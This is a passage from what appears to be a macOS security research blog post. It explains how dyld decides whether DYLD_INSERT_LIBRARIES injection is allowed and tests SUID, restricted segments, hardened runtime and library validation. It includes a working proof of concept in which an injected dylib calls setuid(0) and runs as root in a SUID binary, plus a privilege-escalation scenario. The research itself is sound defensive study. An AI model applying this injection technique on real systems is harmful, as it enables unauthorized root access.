</span></span><span style="display:flex;"><span>		amfiInputFlags <span style="color:#555">|=</span> AMFI_DYLD_INPUT_PROC_IS_ENCRYPTED;
</span></span><span style="display:flex;"><span><span style="color:#099">#endif
</span></span></span><span style="display:flex;"><span><span style="color:#099"></span>	<span style="color:#078;font-weight:bold">uint64_t</span> amfiOutputFlags <span style="color:#555">=</span> <span style="color:#f60">0</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#069;font-weight:bold">if</span> ( <span style="color:#c0f">amfi_check_dyld_policy_self</span>(amfiInputFlags, <span style="color:#555">&amp;</span>amfiOutputFlags) <span style="color:#555">==</span> <span style="color:#f60">0</span> ) {
</span></span><span style="display:flex;"><span>		gLinkContext.allowAtPaths 				<span style="color:#555">=</span> (amfiOutputFlags <span style="color:#555">&amp;</span> AMFI_DYLD_OUTPUT_ALLOW_AT_PATH);
</span></span><span style="display:flex;"><span>		gLinkContext.allowEnvVarsPrint			<span style="color:#555">=</span> (amfiOutputFlags <span style="color:#555">&amp;</span> AMFI_DYLD_OUTPUT_ALLOW_PRINT_VARS);
</span></span><span style="display:flex;"><span>		gLinkContext.allowEnvVarsPath			<span style="color:#555">=</span> (amfiOutputFlags <span style="color:#555">&amp;</span> AMFI_DYLD_OUTPUT_ALLOW_PATH_VARS);
</span></span><span style="display:flex;"><span>		gLinkContext.allowEnvVarsSharedCache	<span style="color:#555">=</span> (amfiOutputFlags <span style="color:#555">&amp;</span> AMFI_DYLD_OUTPUT_ALLOW_CUSTOM_SHARED_CACHE);
</span></span><span style="display:flex;"><span>		gLinkContext.allowClassicFallbackPaths	<span style="color:#555">=</span> (amfiOutputFlags <span style="color:#555">&amp;</span> AMFI_DYLD_OUTPUT_ALLOW_FALLBACK_PATHS);
</span></span><span style="display:flex;"><span>		gLinkContext.allowInsertFailures    	<span style="color:#555">=</span> (amfiOutputFlags <span style="color:#555">&amp;</span> AMFI_DYLD_OUTPUT_ALLOW_FAILED_LIBRARY_INSERTION);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#069;font-weight:bold">else</span> {
</span></span><span style="display:flex;"><span><span style="color:#099">#if __MAC_OS_X_VERSION_MIN_REQUIRED
</span></span></span><span style="display:flex;"><span><span style="color:#099"></span>		<span style="color:#09f;font-style:italic">// support chrooting from old kernel
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>		<span style="color:#078;font-weight:bold">bool</span> isRestricted <span style="color:#555">=</span> <span style="color:#366">false</span>;
</span></span><span style="display:flex;"><span>		<span style="color:#078;font-weight:bold">bool</span> libraryValidation <span style="color:#555">=</span> <span style="color:#366">false</span>;
</span></span><span style="display:flex;"><span>		<span style="color:#09f;font-style:italic">// any processes with setuid or setgid bit set or with __RESTRICT segment is restricted
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>		<span style="color:#069;font-weight:bold">if</span> ( <span style="color:#c0f">issetugid</span>() <span style="color:#555">||</span> <span style="color:#c0f">hasRestrictedSegment</span>(mainExecutableMH) ) {
</span></span><span style="display:flex;"><span>			isRestricted <span style="color:#555">=</span> <span style="color:#366">true</span>;
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		<span style="color:#078;font-weight:bold">bool</span> usingSIP <span style="color:#555">=</span> (<span style="color:#c0f">csr_check</span>(CSR_ALLOW_TASK_FOR_PID) <span style="color:#555">!=</span> <span style="color:#f60">0</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#078;font-weight:bold">uint32_t</span> flags;
</span></span><span style="display:flex;"><span>		<span style="color:#069;font-weight:bold">if</span> ( <span style="color:#c0f">csops</span>(<span style="color:#f60">0</span>, CS_OPS_STATUS, <span style="color:#555">&amp;</span>flags, <span style="color:#069;font-weight:bold">sizeof</span>(flags)) <span style="color:#555">!=</span> <span style="color:#555">-</span><span style="color:#f60">1</span> ) {
</span></span><span style="display:flex;"><span>			<span style="color:#09f;font-style:italic">// On OS X CS_RESTRICT means the program was signed with entitlements
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>			<span style="color:#069;font-weight:bold">if</span> ( ((flags <span style="color:#555">&amp;</span> CS_RESTRICT) <span style="color:#555">==</span> CS_RESTRICT) <span style="color:#555">&amp;&amp;</span> usingSIP ) {
</span></span><span style="display:flex;"><span>				isRestricted <span style="color:#555">=</span> <span style="color:#366">true</span>;
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>			<span style="color:#09f;font-style:italic">// Library Validation loosens searching but requires everything to be code signed
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>			<span style="color:#069;font-weight:bold">if</span> ( flags <span style="color:#555">&amp;</span> CS_REQUIRE_LV ) {
</span></span><span style="display:flex;"><span>				isRestricted <span style="color:#555">=</span> <span style="color:#366">false</span>;
</span></span><span style="display:flex;"><span>				libraryValidation <span style="color:#555">=</span> <span style="color:#366">true</span>;
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		gLinkContext.allowAtPaths                <span style="color:#555">=</span> <span style="color:#555">!</span>isRestricted;
</span></span><span style="display:flex;"><span>		gLinkContext.allowEnvVarsPrint           <span style="color:#555">=</span> <span style="color:#555">!</span>isRestricted;
</span></span><span style="display:flex;"><span>		gLinkContext.allowEnvVarsPath            <span style="color:#555">=</span> <span style="color:#555">!</span>isRestricted;
</span></span><span style="display:flex;"><span>		gLinkContext.allowEnvVarsSharedCache     <span style="color:#555">=</span> <span style="color:#555">!</span>libraryValidation <span style="color:#555">||</span> <span style="color:#555">!</span>usingSIP;
</span></span><span style="display:flex;"><span>		gLinkContext.allowClassicFallbackPaths   <span style="color:#555">=</span> <span style="color:#555">!</span>isRestricted;
</span></span><span style="display:flex;"><span>		gLinkContext.allowInsertFailures         <span style="color:#555">=</span> <span style="color:#366">false</span>;
</span></span><span style="display:flex;"><span><span style="color:#099">#else
</span></span></span><span style="display:flex;"><span><span style="color:#099"></span>		<span style="color:#c0f">halt</span>(<span style="color:#c30">&#34;amfi_check_dyld_policy_self() failed</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#099">#endif
</span></span></span><span style="display:flex;"><span><span style="color:#099"></span>	}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#078;font-weight:bold">bool</span> <span style="color:#c0f">processIsRestricted</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span><span style="color:#099">#if __MAC_OS_X_VERSION_MIN_REQUIRED
</span></span></span><span style="display:flex;"><span><span style="color:#099"></span>	<span style="color:#069;font-weight:bold">return</span> <span style="color:#555">!</span>gLinkContext.allowEnvVarsPath;
</span></span><span style="display:flex;"><span><span style="color:#099">#else
</span></span></span><span style="display:flex;"><span><span style="color:#099"></span>	<span style="color:#069;font-weight:bold">return</span> <span style="color:#366">false</span>;
</span></span><span style="display:flex;"><span><span style="color:#099">#endif
</span></span></span><span style="display:flex;"><span><span style="color:#099"></span>}
</span></span></code></pre></div><p>It will set the <code>gLinkContext.allowEnvVarsPath</code> to false if:</p>
<ol>
<li>The main executable has restricted segment</li>
<li>suid / guid bits are set</li>
<li>SIP is enabled (if anyone wonders <code>CSR_ALLOW_TASK_FOR_PID</code> is a SIP boot configuration flag, but I don’t know much more about it) and the  program has the <code>CS_RESTRICT</code> flag (on OSX = program was signed with entitlements)</li>
</ol>
<p>But! It’s unset if <code>CS_REQUIRE_LV</code> is set. What this flag does? If it’s set for the main binary, it means that the loader will verify every single dylib loaded into the application, if they were signed with the same key as the main executable. If we think about this it kinda makes sense, as you can only inject a dylib to the application that was developed by the same person. You can only abuse this if you have access to that code signing certificate - or not, more on that later ;).</p>
<p>There is another option to protect the application, and it’s enabling <a href="https://developer.apple.com/documentation/security/hardened_runtime_entitlements"  class="external-link" target="_blank" rel="noopener">Hardened Runtime</a>. Then if you want, you can specifically enable DYLD environment variables: <a href="https://developer.apple.com/documentation/bundleresources/entitlements/com_apple_security_cs_allow-dyld-environment-variables"  class="external-link" target="_blank" rel="noopener">Allow DYLD Environment Variables Entitlement - Entitlements</a>. The above source code seems to be dated back to 2013, and this option is only available since Mojave (10.14), which was released last year (2018), probably this is why we don’t see anything about this in the source code.</p>
<p>For the record, these are the values of the CS flags, taken from <a href="https://opensource.apple.com/source/xnu/xnu-4903.221.2/osfmk/kern/cs_blobs.h.auto.html"  class="external-link" target="_blank" rel="noopener">cs_blobs.h</a></p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#099">#define CS_RESTRICT		0x0000800	</span><span style="color:#09f;font-style:italic">/* tell dyld to treat restricted */</span><span style="color:#099">
</span></span></span><span style="display:flex;"><span><span style="color:#099">#define CS_REQUIRE_LV		0x0002000	</span><span style="color:#09f;font-style:italic">/* require library validation */</span><span style="color:#099">
</span></span></span><span style="display:flex;"><span><span style="color:#099">#define CS_RUNTIME		0x00010000  </span><span style="color:#09f;font-style:italic">/* Apply hardened runtime policies */</span><span style="color:#099">
</span></span></span></code></pre></div><p>This was the theory, let’s see all of these in practice, if they indeed work as advertised. I will create an Xcode project and modify the configuration as needed. Before that we can use our original code for the SUID bit testing, and as we can see it works as expected:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#09f;font-style:italic">#setting ownership</span>
</span></span><span style="display:flex;"><span>$ sudo chown root <span style="color:#366">test</span>
</span></span><span style="display:flex;"><span>$ ls -l <span style="color:#366">test</span>
</span></span><span style="display:flex;"><span>-rwxr-xr-x  <span style="color:#f60">1</span> root  staff  <span style="color:#f60">8432</span> Jul  <span style="color:#f60">8</span> 16:46 <span style="color:#366">test</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">#setting suid flag, and running, as we can see the dylib is not run</span>
</span></span><span style="display:flex;"><span>$ sudo chmod +s <span style="color:#366">test</span>
</span></span><span style="display:flex;"><span>$ ls -l <span style="color:#366">test</span>
</span></span><span style="display:flex;"><span>-rwsr-sr-x  <span style="color:#f60">1</span> root  staff  <span style="color:#f60">8432</span> Jul  <span style="color:#f60">8</span> 16:46 <span style="color:#366">test</span>
</span></span><span style="display:flex;"><span>$ ./test 
</span></span><span style="display:flex;"><span>Hello world
</span></span><span style="display:flex;"><span>$ <span style="color:#033">DYLD_INSERT_LIBRARIES</span><span style="color:#555">=</span>inject.dylib ./test
</span></span><span style="display:flex;"><span>Hello world
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">#removing suid flag and running</span>
</span></span><span style="display:flex;"><span>$ sudo chmod -s <span style="color:#366">test</span>
</span></span><span style="display:flex;"><span>$ ls -l <span style="color:#366">test</span>
</span></span><span style="display:flex;"><span>-rwxr-xr-x  <span style="color:#f60">1</span> root  staff  <span style="color:#f60">8432</span> Jul  <span style="color:#f60">8</span> 16:46 <span style="color:#366">test</span>
</span></span><span style="display:flex;"><span>$ <span style="color:#033">DYLD_INSERT_LIBRARIES</span><span style="color:#555">=</span>inject.dylib ./test
</span></span><span style="display:flex;"><span>Hello from dylib!
</span></span><span style="display:flex;"><span>Hello world
</span></span></code></pre></div><p>Interestingly, in the past, there was an LPE bug from incorrectly handling one of the environment variables, and with SUID files, you could achieve privilege escalation, here you can read the details:
<a href="https://www.sektioneins.de/blog/15-07-07-dyld_print_to_file_lpe.html"  class="external-link" target="_blank" rel="noopener">OS X 10.10 DYLD_PRINT_TO_FILE Local Privilege Escalation Vulnerability | SektionEins GmbH</a></p>
<p>I created a complete blank Cocoa App for testing the other stuff. I also export the environment variable, so we don’t need to specify it always:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#366">export</span> <span style="color:#033">DYLD_INSERT_LIBRARIES</span><span style="color:#555">=</span>inject.dylib
</span></span></code></pre></div><p>If we compile it, and run as default, we can see that dylib is injected:</p>
<pre tabindex="0"><code>$ ./HelloWorldCocoa.app/Contents/MacOS/HelloWorldCocoa 
Hello from dylib!
</code></pre><p>To have a restricted section, on the <code>Build Settings -&gt; Linking -&gt; Other linker flags</code> let’s set this value:</p>
<pre tabindex="0"><code>-Wl,-sectcreate,__RESTRICT,__restrict,/dev/null
</code></pre><p>If we recompile, we will see a whole bunch of errors, that dylibs are being ignored, like these:</p>
<pre tabindex="0"><code>dyld: warning, LC_RPATH @executable_path/../Frameworks in /Users/csaby/Library/Developer/Xcode/DerivedData/HelloWorldCocoa-apovdjtqwdvhlzddnqghiknptqqb/Build/Products/Debug/HelloWorldCocoa.app/Contents/MacOS/HelloWorldCocoa being ignored in restricted program because of @executable_path
dyld: warning, LC_RPATH @executable_path/../Frameworks in /Users/csaby/Library/Developer/Xcode/DerivedData/HelloWorldCocoa-apovdjtqwdvhlzddnqghiknptqqb/Build/Products/Debug/HelloWorldCocoa.app/Contents/MacOS/HelloWorldCocoa being ignored in restricted program because of @executable_path
</code></pre><p>Our dylib is also not loaded, so indeed it works as expected. We can verify the segment being present with the size command, and indeed we can see it there:</p>
<pre tabindex="0"><code>$ size -x -l -m HelloWorldCocoa.app/Contents/MacOS/HelloWorldCocoa
Segment __PAGEZERO: 0x100000000 (vmaddr 0x0 fileoff 0)
Segment __TEXT: 0x2000 (vmaddr 0x100000000 fileoff 0)
	Section __text: 0x15c (addr 0x1000012b0 offset 4784)
	Section __stubs: 0x24 (addr 0x10000140c offset 5132)
	Section __stub_helper: 0x4c (addr 0x100001430 offset 5168)
	Section __objc_classname: 0x2d (addr 0x10000147c offset 5244)
	Section __objc_methname: 0x690 (addr 0x1000014a9 offset 5289)
	Section __objc_methtype: 0x417 (addr 0x100001b39 offset 6969)
	Section __cstring: 0x67 (addr 0x100001f50 offset 8016)
	Section __unwind_info: 0x48 (addr 0x100001fb8 offset 8120)
	total 0xd4f
Segment __DATA: 0x1000 (vmaddr 0x100002000 fileoff 8192)
	Section __nl_symbol_ptr: 0x10 (addr 0x100002000 offset 8192)
	Section __la_symbol_ptr: 0x30 (addr 0x100002010 offset 8208)
	Section __objc_classlist: 0x8 (addr 0x100002040 offset 8256)
	Section __objc_protolist: 0x10 (addr 0x100002048 offset 8264)
	Section __objc_imageinfo: 0x8 (addr 0x100002058 offset 8280)
	Section __objc_const: 0x9a0 (addr 0x100002060 offset 8288)
	Section __objc_ivar: 0x8 (addr 0x100002a00 offset 10752)
	Section __objc_data: 0x50 (addr 0x100002a08 offset 10760)
	Section __data: 0xc0 (addr 0x100002a58 offset 10840)
	total 0xb18
Segment __RESTRICT: 0x0 (vmaddr 0x100003000 fileoff 12288)
	Section __restrict: 0x0 (addr 0x100003000 offset 12288)
	total 0x0
Segment __LINKEDIT: 0x6000 (vmaddr 0x100003000 fileoff 12288)
total 0x100009000
</code></pre><p>Alternatively we can use the <code>otool -l [path to the binary]</code> command for the same purpose, the output will be slightly different.</p>
<p>Next one is setting the app to have  ( <a href="https://developer.apple.com/documentation/security/hardened_runtime_entitlements"  class="external-link" target="_blank" rel="noopener">hardened runtime</a> ), we can do this at the <code>Build Settings -&gt; Signing -&gt; Enable Hardened Runtime</code> or at the Capabilities section. If we do this and rebuild the app, and try to run it, we get the following error:</p>
<pre tabindex="0"><code>dyld: warning: could not load inserted library &#39;inject.dylib&#39; into hardened process because no suitable image found.  Did find:
	inject.dylib: code signature in (inject.dylib) not valid for use in process using Library Validation: mapped file has no cdhash, completely unsigned? Code has to be at least ad-hoc signed.
	inject.dylib: stat() failed with errno=1
</code></pre><p>If I code sign my dylib using the same certificate the dylib will be loaded:</p>
<pre tabindex="0"><code>codesign -s &#34;Mac Developer: fitzl.csaba.dev@gmail.com (RQGUDM4LR2)&#34; inject.dylib
</code></pre><pre tabindex="0"><code>$ codesign -dvvv inject.dylib 
Executable=inject.dylib
Identifier=inject
Format=Mach-O thin (x86_64)
CodeDirectory v=20200 size=230 flags=0x0(none) hashes=3+2 location=embedded
Hash type=sha256 size=32
CandidateCDHash sha256=348bf4f1a2cf3d6b608e3d4cfd0d673fdd7c9795
Hash choices=sha256
CDHash=348bf4f1a2cf3d6b608e3d4cfd0d673fdd7c9795
Signature size=4707
Authority=Mac Developer: fitzl.csaba.dev@gmail.com (RQGUDM4LR2)
Authority=Apple Worldwide Developer Relations Certification Authority
Authority=Apple Root CA
Signed Time=2019. Jul 9. 11:40:15
Info.plist=not bound
TeamIdentifier=33YRLYRBYV
Sealed Resources=none
Internal requirements count=1 size=180

$ /HelloWorldCocoa.app/Contents/MacOS/HelloWorldCocoa 
Hello from dylib!
</code></pre><p>If I use another certificate for code signing, it won’t be loaded as you can see below. I want to highlight that this verification is always being done, it’s not a Gatekeeper thing.</p>
<pre tabindex="0"><code>$ codesign -f -s &#34;Mac Developer: fitzl.csaba@gmail.com (M9UN3Y3UDG)&#34; inject.dylib 
inject.dylib: replacing existing signature

$ codesign -dvvv inject.dylib 
Executable=inject.dylib
Identifier=inject
Format=Mach-O thin (x86_64)
CodeDirectory v=20200 size=230 flags=0x0(none) hashes=3+2 location=embedded
Hash type=sha256 size=32
CandidateCDHash sha256=2a3de5a788d89ef100d1193c492bfddd6042e04c
Hash choices=sha256
CDHash=2a3de5a788d89ef100d1193c492bfddd6042e04c
Signature size=4703
Authority=Mac Developer: fitzl.csaba@gmail.com (M9UN3Y3UDG)
Authority=Apple Worldwide Developer Relations Certification Authority
Authority=Apple Root CA
Signed Time=2019. Jul 9. 11:43:57
Info.plist=not bound
TeamIdentifier=E7Q33VUH49
Sealed Resources=none
Internal requirements count=1 size=176

$ /HelloWorldCocoa.app/Contents/MacOS/HelloWorldCocoa 
dyld: warning: could not load inserted library &#39;inject.dylib&#39; into hardened process because no suitable image found.  Did find:
	inject.dylib: code signature in (inject.dylib) not valid for use in process using Library Validation: mapping process and mapped file (non-platform) have different Team IDs
	inject.dylib: stat() failed with errno=1
</code></pre><p>Interestingly, even if I set the <code>com.apple.security.cs.allow-dyld-environment-variables</code> entitlement at the capabilities page, I can’t load a dylib with other signature. Not sure what I’m doing wrong.</p>
<p><img src="https://theevilbit.github.io/images/DYLD_INSERT_LIBRARIES_DYLIB_injection_in_macOS_OSX_deep_dive/Screenshot%202019-07-09%20at%2012.54.44.png" alt="image"></p>
<p>To move on, let’s set the library validation (<code>CS_REQUIRE_LV</code>) requirement for the application. It can be done, by going to <code>Build Settings -&gt; Signing -&gt; Other Code Signing Flags</code> and set it to <code>-o library</code>. If we recompile and check the code signature for our binary, we can see it enabled:</p>
<pre tabindex="0"><code>$ codesign -dvvv /HelloWorldCocoa.app/Contents/MacOS/HelloWorldCocoa 
Executable=/HelloWorldCocoa.app/Contents/MacOS/HelloWorldCocoa
(...)
CodeDirectory v=20200 size=377 flags=0x2000(library-validation) hashes=4+5 location=embedded
(...)
</code></pre><p>And we get the same error message as with the hardened runtime if we try to load a dylib with different signer.</p>
<pre tabindex="0"><code>dyld: warning: could not load inserted library &#39;inject.dylib&#39; into hardened process because no suitable image found.  Did find:
	inject.dylib: code signature in (inject.dylib) not valid for use in process using Library Validation: mapping process and mapped file (non-platform) have different Team IDs
	inject.dylib: stat() failed with errno=1
</code></pre><p>The last item to try would be to set the <code>CS_RESTRICT</code> flag, but the only thing I found about this is that it’s a special flag only set for Apple binaries. If anyone can give more background, let me know, I’m curious. The only thing I could do to verify it, is trying to inject to an Apple binary, which doesn’t have the previous flags set, not a suid file neither has a RESTRICTED segment. Interestingly the <code>CS_RESTRICT</code> flag is not reflected by the code signing utility. I picked up Disk Utility. Indeed our dylib is not loaded:</p>
<pre tabindex="0"><code>$ codesign -dvvv /Applications/Utilities/Disk\ Utility.app/Contents/MacOS/Disk\ Utility 
Executable=/Applications/Utilities/Disk Utility.app/Contents/MacOS/Disk Utility
Identifier=com.apple.DiskUtility
Format=app bundle with Mach-O thin (x86_64)
CodeDirectory v=20100 size=8646 flags=0x0(none) hashes=263+5 location=embedded
Platform identifier=7
Hash type=sha256 size=32
CandidateCDHash sha256=2fbbd1e193e5dff4248aadeef196ef181b1adc26
Hash choices=sha256
CDHash=2fbbd1e193e5dff4248aadeef196ef181b1adc26
Signature size=4485
Authority=Software Signing
Authority=Apple Code Signing Certification Authority
Authority=Apple Root CA
Info.plist entries=28
TeamIdentifier=not set
Sealed Resources version=2 rules=13 files=1138
Internal requirements count=1 size=72

$ DYLD_INSERT_LIBRARIES=inject.dylib /Applications/Utilities/Disk\ Utility.app/Contents/MacOS/Disk\ Utility 
</code></pre><p>I would say that’s all, but no. Let’s go back to the fact that you can inject a dylib even to SUID files if the <code>CS_REQUIRE_LV</code> flag is set. (In fact probably also to files with the <code>CS_RUNTIME</code> flag). Yes, only dylibs with the same signature, but there is a potential (although small) for privilege escalation. To show, I modified my dylib:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#099">#include</span> <span style="color:#099">&lt;stdio.h&gt;</span><span style="color:#099">
</span></span></span><span style="display:flex;"><span><span style="color:#099">#include</span> <span style="color:#099">&lt;syslog.h&gt;</span><span style="color:#099">
</span></span></span><span style="display:flex;"><span><span style="color:#099">#include</span> <span style="color:#099">&lt;stdlib.h&gt;</span><span style="color:#099">
</span></span></span><span style="display:flex;"><span><span style="color:#099"></span>
</span></span><span style="display:flex;"><span><span style="color:#c0f">__attribute__</span>((constructor))
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">static</span> <span style="color:#078;font-weight:bold">void</span> <span style="color:#c0f">customConstructor</span>(<span style="color:#078;font-weight:bold">int</span> argc, <span style="color:#069;font-weight:bold">const</span> <span style="color:#078;font-weight:bold">char</span> <span style="color:#555">**</span>argv)
</span></span><span style="display:flex;"><span> {
</span></span><span style="display:flex;"><span>	<span style="color:#c0f">setuid</span>(<span style="color:#f60">0</span>);
</span></span><span style="display:flex;"><span> 	<span style="color:#c0f">system</span>(<span style="color:#c30">&#34;id&#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#c0f">printf</span>(<span style="color:#c30">&#34;Hello from dylib!</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#c0f">syslog</span>(LOG_ERR, <span style="color:#c30">&#34;Dylib injection successful in %s</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>, argv[<span style="color:#f60">0</span>]);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Let’s sign this, and the test program with the same certificate and set the SUID bit for the test binary and run it. As we can see we can inject a dylib as expected and indeed it will run as root.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gcc -dynamiclib inject.c -o inject.dylib
</span></span><span style="display:flex;"><span>codesign -f -s <span style="color:#c30">&#34;Mac Developer: fitzl.csaba@gmail.com (M9UN3Y3UDG)&#34;</span> inject.dylib
</span></span><span style="display:flex;"><span>codesign -f -s <span style="color:#c30">&#34;Mac Developer: fitzl.csaba@gmail.com (M9UN3Y3UDG)&#34;</span> -o library <span style="color:#366">test</span>
</span></span><span style="display:flex;"><span>sudo chown root <span style="color:#366">test</span>
</span></span><span style="display:flex;"><span>sudo chmod +s <span style="color:#366">test</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ls -l <span style="color:#366">test</span>
</span></span><span style="display:flex;"><span>-rwsr-sr-x  <span style="color:#f60">1</span> root  staff  <span style="color:#f60">26912</span> Jul  <span style="color:#f60">9</span> 14:01 <span style="color:#366">test</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>codesign -dvvv <span style="color:#366">test</span>
</span></span><span style="display:flex;"><span><span style="color:#033">Executable</span><span style="color:#555">=</span>/Users/csaby/Downloads/test
</span></span><span style="display:flex;"><span><span style="color:#033">Identifier</span><span style="color:#555">=</span><span style="color:#366">test</span>
</span></span><span style="display:flex;"><span><span style="color:#033">Format</span><span style="color:#555">=</span>Mach-O thin <span style="color:#555">(</span>x86_64<span style="color:#555">)</span>
</span></span><span style="display:flex;"><span>CodeDirectory <span style="color:#033">v</span><span style="color:#555">=</span><span style="color:#f60">20200</span> <span style="color:#033">size</span><span style="color:#555">=</span><span style="color:#f60">228</span> <span style="color:#033">flags</span><span style="color:#555">=</span>0x2000<span style="color:#555">(</span>library-validation<span style="color:#555">)</span> <span style="color:#033">hashes</span><span style="color:#555">=</span>3+2 <span style="color:#033">location</span><span style="color:#555">=</span>embedded
</span></span><span style="display:flex;"><span>Hash <span style="color:#033">type</span><span style="color:#555">=</span>sha256 <span style="color:#033">size</span><span style="color:#555">=</span><span style="color:#f60">32</span>
</span></span><span style="display:flex;"><span>CandidateCDHash <span style="color:#033">sha256</span><span style="color:#555">=</span>7d06a7229cbc476270e455cb3ef88bdddf109f12
</span></span><span style="display:flex;"><span>Hash <span style="color:#033">choices</span><span style="color:#555">=</span>sha256
</span></span><span style="display:flex;"><span><span style="color:#033">CDHash</span><span style="color:#555">=</span>7d06a7229cbc476270e455cb3ef88bdddf109f12
</span></span><span style="display:flex;"><span>Signature <span style="color:#033">size</span><span style="color:#555">=</span><span style="color:#f60">4703</span>
</span></span><span style="display:flex;"><span><span style="color:#033">Authority</span><span style="color:#555">=</span>Mac Developer: fitzl.csaba@gmail.com <span style="color:#555">(</span>M9UN3Y3UDG<span style="color:#555">)</span>
</span></span><span style="display:flex;"><span><span style="color:#033">Authority</span><span style="color:#555">=</span>Apple Worldwide Developer Relations Certification Authority
</span></span><span style="display:flex;"><span><span style="color:#033">Authority</span><span style="color:#555">=</span>Apple Root CA
</span></span><span style="display:flex;"><span>Signed <span style="color:#033">Time</span><span style="color:#555">=</span>2019. Jul 9. 14:01:03
</span></span><span style="display:flex;"><span>Info.plist<span style="color:#555">=</span>not bound
</span></span><span style="display:flex;"><span><span style="color:#033">TeamIdentifier</span><span style="color:#555">=</span>E7Q33VUH49
</span></span><span style="display:flex;"><span>Sealed <span style="color:#033">Resources</span><span style="color:#555">=</span>none
</span></span><span style="display:flex;"><span>Internal requirements <span style="color:#033">count</span><span style="color:#555">=</span><span style="color:#f60">1</span> <span style="color:#033">size</span><span style="color:#555">=</span><span style="color:#f60">172</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>./test 
</span></span><span style="display:flex;"><span><span style="color:#033">uid</span><span style="color:#555">=</span>0<span style="color:#555">(</span>root<span style="color:#555">)</span> <span style="color:#033">gid</span><span style="color:#555">=</span>0<span style="color:#555">(</span>wheel<span style="color:#555">)</span> <span style="color:#033">egid</span><span style="color:#555">=</span>20<span style="color:#555">(</span>staff<span style="color:#555">)</span> <span style="color:#033">groups</span><span style="color:#555">=</span>0<span style="color:#555">(</span>wheel<span style="color:#555">)</span>,1<span style="color:#555">(</span>daemon<span style="color:#555">)</span>,2<span style="color:#555">(</span>kmem<span style="color:#555">)</span>,3<span style="color:#555">(</span>sys<span style="color:#555">)</span>,4<span style="color:#555">(</span>tty<span style="color:#555">)</span>,5<span style="color:#555">(</span>operator<span style="color:#555">)</span>,8<span style="color:#555">(</span>procview<span style="color:#555">)</span>,9<span style="color:#555">(</span>procmod<span style="color:#555">)</span>,12<span style="color:#555">(</span>everyone<span style="color:#555">)</span>,20<span style="color:#555">(</span>staff<span style="color:#555">)</span>,29<span style="color:#555">(</span>certusers<span style="color:#555">)</span>,61<span style="color:#555">(</span>localaccounts<span style="color:#555">)</span>,80<span style="color:#555">(</span>admin<span style="color:#555">)</span>,702<span style="color:#555">(</span>com.apple.sharepoint.group.2<span style="color:#555">)</span>,701<span style="color:#555">(</span>com.apple.sharepoint.group.1<span style="color:#555">)</span>,33<span style="color:#555">(</span>_appstore<span style="color:#555">)</span>,98<span style="color:#555">(</span>_lpadmin<span style="color:#555">)</span>,100<span style="color:#555">(</span>_lpoperator<span style="color:#555">)</span>,204<span style="color:#555">(</span>_developer<span style="color:#555">)</span>,250<span style="color:#555">(</span>_analyticsusers<span style="color:#555">)</span>,395<span style="color:#555">(</span>com.apple.access_ftp<span style="color:#555">)</span>,398<span style="color:#555">(</span>com.apple.access_screensharing<span style="color:#555">)</span>,399<span style="color:#555">(</span>com.apple.access_ssh<span style="color:#555">)</span>
</span></span><span style="display:flex;"><span>Hello from dylib!
</span></span><span style="display:flex;"><span>Hello world 
</span></span></code></pre></div><p>In theory you need one of the following to exploit this:</p>
<ol>
<li>Have the code signing certificate of the original executable (very unlikely)</li>
<li>Have write access to the folder, where the file with SUID bit present -&gt; in this case you can sign the file with your own certificate (code sign will replace the file you sign, so it will delete the original and create a new - this is possible because on *nix systems you can delete files from directories, where you are the owner even if the file is owned by root), wait for the SUID bit to be restored (fingers crossed) and finally inject your own dylib. You would think that such scenario wouldn’t exist, but I did find an example for it.</li>
</ol>
<p>Here is a quick and dirty python script to find #2 items, mostly put together from StackOverflow :D</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#09f;font-style:italic">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span>
